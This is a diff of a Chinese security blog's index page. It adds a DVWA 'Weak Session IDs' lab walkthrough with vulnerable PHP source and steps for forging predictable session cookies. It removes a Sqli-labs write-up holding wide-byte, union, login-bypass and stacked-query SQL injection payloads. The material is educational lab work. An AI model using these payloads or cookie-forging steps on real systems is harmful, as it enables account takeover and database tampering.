@@ -134,6 +134,117 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DVWA 8-Weak Session IDs（弱Session ID）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/">DVWA 8-Weak Session IDs（弱Session ID）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/" class="archive-article-date">
+  	<time datetime="2019-02-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\weak_id\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>点击<code>Generate</code>，向服务器提交当前的<code>dvwaSession</code>值</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-1.png" alt="8-1"></p>
+<p>密码与证书等认证手段，一般仅仅用于登录(<code>Login</code>)的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时,都再使用密码认证一次。因此，当认证完成后，就需要替换一个对用户透明的凭证。这个凭证就是<code>SessionID</code>。</p>
+<p>当用户登陆完成后，在服务器端就会创建一个新的会话(<code>Session</code>)，会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的<code>Session</code>，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个<code>Session</code>，浏览器需要把当前用户持有的<code>SessionID</code>告知服务器。最常见的做法就是把<code>SessionID</code>加密后保存在<code>Cookie</code>中，因为<code>Cookie</code>会随着<code>HTTP</code>请求头发送，且受到浏览器同源策略的保护。</p>
+<p><code>SessionID</code>一旦在生命周期内被窃取，就等同于账户失窃。同时由于<code>SessionID</code>是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。<code>Session</code>劫持就是一种通过窃取用户<code>SessionID</code>后，使用该<code>SessionID</code>登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效<code>Session</code>。如果<code>SessionID</code>是保存在<code>Cookie</code>中的，则这种攻击可以称为<code>Cookie</code>劫持。<code>SessionID</code>还可以保存在<code>URL</code>中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
+<p>因此，在生成<code>SessionID</code>时，需要保证足够的随机性，比如采用足够强的伪随机数生成算法。</p>
+<p>— 摘自《白帽子讲 web 安全》</p>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id'</span>])) &#123;</span><br><span class="line">		$_SESSION[<span class="string">'last_session_id'</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">'last_session_id'</span>]++;</span><br><span class="line">	$cookie_value = $_SESSION[<span class="string">'last_session_id'</span>];</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>了解本漏洞，需要用到2个浏览器</p>
+<p>在<code>A浏览器</code>点击Generate并用burpsuit抓包，从抓取的包中可以看到<code>dvwaSession=1</code>，这也验证了源码。在点击<code>go</code>之后，从服务器返回的响应头中可以看到<code>Set-Cookie: dvwaSession=2</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-2.png" alt="8-2"></p>
+<p>在多按几次Generate，发现<code>dvwaSession</code>字段就是会每次加1。现在我们切换到<code>B浏览器</code>，借用<code>Hackbar</code>工具，URL地址从burpsuit中copy下来：<code>192.168.0.108/dvwa/vulnerabilities/weak_id/</code>，Cookie也copy下来：<code>dvwaSession=4; security=low; PHPSESSID=vvto3lge8mrfug568nmngbpbt1</code>，然后点击<code>Execute</code>后直接跳转到刚才的界面来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-3.png" alt="8-3"></p>
+<p>可以看到，直接实现没有用户名和密码验证的登录</p>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	$cookie_value = time();</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从源代码中可以看出，<code>dvwaSession</code>的值变成了<code>time()</code>函数的返回结果（也就是时间戳），同样的点击<code>Generate</code>并抓包可以看到</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-4.png" alt="8-4"></p>
+<p>先抓一个包，发现<code>dvwaSession=1565621880</code>，过几秒再抓包发现<code>dvwaSession=1565621885</code>，验证了这个值的确是随着时间戳的变化而变化。我们继续用<code>B浏览器</code>发起请求，URL：<code>192.168.0.108/dvwa/vulnerabilities/weak_id/</code>；Cookie：<code>dvwaSession=1565622945; security=medium; PHPSESSID=vvto3lge8mrfug568nmngbpbt1</code>。登录成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-5.png" alt="8-5"></p>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id_high'</span>])) &#123;</span><br><span class="line">		$_SESSION[<span class="string">'last_session_id_high'</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$_SESSION[<span class="string">'last_session_id_high'</span>]++;</span><br><span class="line">	$cookie_value = md5($_SESSION[<span class="string">'last_session_id_high'</span>]);</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>setcookie()</code>函数：发送 Cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setcookie ( string $name [, string $value = &quot;&quot; [, int $expire = 0 [, string $path = &quot;&quot; [, string $domain = &quot;&quot; [, bool $secure = false [, bool $httponly = false ]]]]]] ) : bool</span><br><span class="line"></span><br><span class="line">name：Cookie 名称</span><br><span class="line"></span><br><span class="line">value：Cookie 值。 这个值储存于用户的电脑里，请勿储存敏感信息。 比如 name 是 &apos;cookiename&apos;， 可通过 $_COOKIE[&apos;cookiename&apos;] 获取它的值</span><br><span class="line"></span><br><span class="line">expire：Cookie 的过期时间。 这是个 Unix 时间戳，即 Unix 纪元以来（格林威治时间 1970 年 1 月 1 日 00:00:00）的秒数。 也就是说，基本可以用 time() 函数的结果加上希望过期的秒数。 或者也可以用 mktime()。 time()+60*60*24*30 就是设置 Cookie 30 天后过期。 如果设置成零，或者忽略参数， Cookie 会在会话结束时过期（也就是关掉浏览器时）</span><br><span class="line">Note:你可能注意到了，expire 使用 Unix 时间戳而非 Wdy, DD-Mon-YYYY HH:MM:SS GMT 这样的日期格式，是因为 PHP 内部作了转换</span><br><span class="line"></span><br><span class="line">path：Cookie 有效的服务器路径。 设置成 &apos;/&apos; 时，Cookie 对整个域名 domain 有效。 如果设置成 &apos;/foo/&apos;， Cookie 仅仅对 domain 中 /foo/ 目录及其子目录有效（比如 /foo/bar/）。 默认值是设置 Cookie 时的当前目录</span><br><span class="line"></span><br><span class="line">domain：Cookie 的有效域名/子域名。 设置成子域名（例如 &apos;www.example.com&apos;），会使 Cookie 对这个子域名和它的三级域名有效（例如 w2.www.example.com）。 要让 Cookie 对整个域名有效（包括它的全部子域名），只要设置成域名就可以了（这个例子里是 &apos;example.com&apos;）</span><br><span class="line">旧版浏览器仍然在使用废弃的 » RFC 2109， 需要一个前置的点 . 来匹配所有子域名。</span><br><span class="line"></span><br><span class="line">secure：设置这个 Cookie 是否仅仅通过安全的 HTTPS 连接传给客户端。 设置成 TRUE 时，只有安全连接存在时才会设置 Cookie。 如果是在服务器端处理这个需求，程序员需要仅仅在安全连接上发送此类 Cookie （通过 $_SERVER[&quot;HTTPS&quot;] 判断）</span><br><span class="line"></span><br><span class="line">httponly：设置成 TRUE，Cookie 仅可通过 HTTP 协议访问。 这意思就是 Cookie 无法通过类似 JavaScript 这样的脚本语言访问。 要有效减少 XSS 攻击时的身份窃取行为，可建议用此设置（虽然不是所有浏览器都支持），不过这个说法经常有争议。 PHP 5.2.0 中添加。 TRUE 或 FALSE</span><br></pre></td></tr></table></figure>
+<p>直接将刚才抓到的请求中的<code>security</code>字段改为<code>high</code>然后点击<code>go</code>，就可以看到服务器设置的新的<code>dvwaSession</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-6.png" alt="8-6"></p>
+<p>这个<code>dvwaSession</code>每次请求，经过过<code>加1</code>，<code>md5加密</code>。但是如果这被我们发现了规律（从0开始每次加1），当我们知道下一个dvwaSession的值后，经过md5加密再去提交</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-8.png" alt="8-8"></p>
+<p>然后还是像之前一样直接发起请求，URL：<code>192.168.0.108/dvwa/vulnerabilities/weak_id/</code>；Cookie：<code>dvwaSession=eccbc87e4b5ce2fe28308fd9f2a7baf3; security=high; PHPSESSID=vvto3lge8mrfug568nmngbpbt1</code>。登录成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/8-7.png" alt="8-7"></p>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">	$cookie_value = sha1(mt_rand() . time() . <span class="string">"Impossible"</span>);</span><br><span class="line">	setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在本难度中，<code>dvwaSession</code>的值采用<code>随机数+时间戳+&quot;Impossible&quot;</code>，这就无法猜测出到底是多少了。并且开启了<code>setcookie</code>函数中的<code>secure</code>和<code>httponly</code>选项。实现了用户安全会话认证</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="http://www.storysec.com/dvwa-weak-session-ids.html" target="_blank" rel="noopener">http://www.storysec.com/dvwa-weak-session-ids.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DVWA 7-SQL Injection（SQL注入）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1219,130 +1330,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/02/02/Sqli-labs 第41-50关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Sqli-labs 第31-40关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/01/Sqli-labs 第31-40关/">Sqli-labs(第31-40关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/01/Sqli-labs 第31-40关/" class="archive-article-date">
-  	<time datetime="2019-01-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/31/Sqli-labs%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></p>
-<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>本关开始，考查的是<code>宽字节注入</code>的利用，关于宽字节注入的知识点可以看我的文章<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a>的<code>Tip 4</code> </p>
-<p>我们提交以下payload时，发现<code>单引号&#39;</code>被转义了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/2-1.png" alt="2-1"></p>
-<p>查看源码，发现使用了<code>check_addslashes()</code>函数对id进行了处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id=check_addslashes($_GET[&apos;id&apos;]);</span><br></pre></td></tr></table></figure>
-<p>看一下这个函数的功能，就是对<code>反斜杠</code>\、<code>单引号</code>‘、<code>双引号</code>“的过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>源码中设置mysql使用<code>GBK</code>编码，那这里就可以使用<code>%df</code>来把<code>反斜杠\</code>给吃掉</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br></pre></td></tr></table></figure>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/2-2.png" alt="2-2"></p>
-<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>本关与前一关不一样的是，对id的处理使用了<code>addslashes()</code>函数</p>
-<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>预定义字符是：</p>
-<p>单引号（’）双引号（”）反斜杠（\）</p>
-<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>那么这个函数的功能和前一关的函数功能是一样的，所以也可以使用一样的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>本关的参数改成通过<code>POST</code>方式提交，但是对参数的处理没有变，同样是<code>addslashes()</code>函数</p>
-<p>不一样的是，通过输入框传入的参数浏览器不会解码，所以这里不能像之前那样直接填%df%27，直接填经过<code>URL编码</code>过后的：<code>�&#39;</code></p>
-<p>所以用户名填：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&apos; or 1=1 #</span><br></pre></td></tr></table></figure>
-<p>密码随意</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/4-1.png" alt="4-1"></p>
-<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>本关直接就是<code>整数型注入</code>，参数<code>id</code>没有单引号包裹，刚开始没注意还被搞混了</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 #</span><br></pre></td></tr></table></figure>
-<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>与前面一样，没有多大区别，唯一发现区别就是<code>井号#</code>使用不了，要用<code>--+</code>代替，payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p>但是看一下源码后，发现本关使用的过滤函数是<code>mysql_real_escape_string()</code>，受影响的字符：<code>\x00\n\r\&#39;&quot;\x1a</code>，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
-<p>但是因mysql并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。</p>
-<p>还可以使用以下payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%EF%BF%BD%27union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p>Notice:<br>在使用mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将mysql设置为gbk即可。<br>设置代码：Mysql_set_charset(‘gbk’,’$conn’)</p>
-<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>与Less-34关原理差不多，只是过滤函数是<code>mysql_real_escape_string()</code>，同样使用万能钥匙登录，密码随意</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&apos; or 1=1#</span><br></pre></td></tr></table></figure>
-<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>本关开始，考查的是<code>堆叠注入</code>的利用，关于堆叠注入的知识点可以看我的文章<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a>的<code>Tip 5</code> </p>
-<p>在发现使用单引号包括参数之后，使用以下payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
-<p>去数据库查询时，已经成功插入</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/8-1.png" alt="8-1"></p>
-<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关与上一关区别只在于参数没有被包括，payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关与上一关区别只在于参数被<code>(&#39;&#39;)</code>包裹，payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;);insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
-<p>至此，31-40关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/02/Sqli-labs%20%E7%AC%AC41-50%E5%85%B3/">第41-50关Write-up</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/01/Sqli-labs 第31-40关/">展开全文 >></a>
         </p>
       
 
